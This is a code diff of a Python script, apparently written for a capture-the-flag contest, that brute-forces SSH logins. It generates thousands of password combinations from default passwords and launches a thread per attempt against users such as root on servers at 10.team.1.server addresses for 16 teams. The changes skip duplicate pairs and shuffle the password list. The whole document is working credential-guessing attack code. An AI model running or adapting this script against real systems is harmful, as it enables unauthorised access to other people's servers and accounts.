@@ -26,6 +26,7 @@ users = ["root", "jimmu", "suizei", "annei", "itoku"]
 all_pass = []
 for i in range(len(default_passwords)):
 	for j in range(len(default_passwords)):
+		if i == j: continue
 		for k in range(100):
 			one = default_passwords[i].strip("\n")
 			two = default_passwords[j].strip("\n")
@@ -37,6 +38,7 @@ for i in range(len(default_passwords)):
 				all_pass += [f"{one.capitalize()}-{two}-{k}!"]
 				all_pass += [f"{two.capitalize()}-{one}-{k}!"]
 
+random.shuffle(all_pass)
 print(f"Created passwords: {len(all_pass)}")
 
 # each team
@@ -45,7 +47,7 @@ for team in range(1, 17):
 	# each teams servers
 	for server in [1, 2, 3, 4, 5, 6, 11, 12, 13, 20, 21, 22, 42, 69]:
 		# check each default password
-		for password in all_pass:
+		for password in all_pass:	
 			for user in users:
 				x = threading.Thread(target=ssh, args=(user, f"10.{team}.1.{server}", password))
 				x.start()
